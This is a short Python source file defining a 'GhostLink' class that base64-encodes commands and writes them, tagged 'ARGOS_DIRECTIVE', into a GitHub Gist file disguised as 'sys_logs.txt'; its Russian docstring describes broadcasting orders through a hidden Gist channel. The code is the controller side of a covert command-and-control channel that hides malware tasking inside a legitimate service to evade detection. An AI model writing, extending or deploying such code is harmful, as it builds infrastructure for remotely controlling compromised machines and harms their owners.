
import base64, requests, time, json
class GhostLink:
    def __init__(self, token, gist_id):
        self.token = token
        self.gist_id = gist_id
        self.headers = {"Authorization": f"token {self.token}", "Accept": "application/vnd.github.v3+json"}

    def broadcast(self, command, label="DIRECTIVE"):
        """Трансляция приказа через скрытый канал Gist"""
        ts = str(int(time.time()))
        cmd_b64 = base64.b64encode(command.encode()).decode()
        payload = f"ARGOS_{label}:{cmd_b64}:{ts}:"
        try:
            url = f"https://api.github.com/gists/{self.gist_id}"
            requests.patch(url, headers=self.headers, json={"files": {"sys_logs.txt": {"content": payload}}})
            return True
        except: return False
